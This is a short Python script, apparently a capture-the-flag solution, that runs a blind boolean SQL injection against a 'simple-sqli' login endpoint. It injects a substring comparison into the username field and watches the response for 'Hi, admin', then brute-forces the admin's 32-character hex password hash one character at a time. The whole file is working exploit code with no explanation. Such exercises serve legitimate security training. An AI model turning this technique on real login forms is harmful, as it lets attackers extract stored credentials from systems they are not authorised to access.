import requests

sess = requests.session()

def login(n, ch):
    url = 'https://uw2017.p4.team/simple-sqli'

    data = {
        'username': "admin' and substring((SELECT password FROM users WHERE username='admin'), {}, 1) = '{}'#".format(n, ch),
        'password': 'fdsfasd'
    }

    # print(data)

    resp = sess.post(url, data=data)

    return "Hi, admin" in resp.text

login(1, '3')

result = ''

for i in range(1, 33):
    for c in '0123456789' + 'abcdefABCDEF':
        if login(i, c):
            result += c
            print(result)
            break
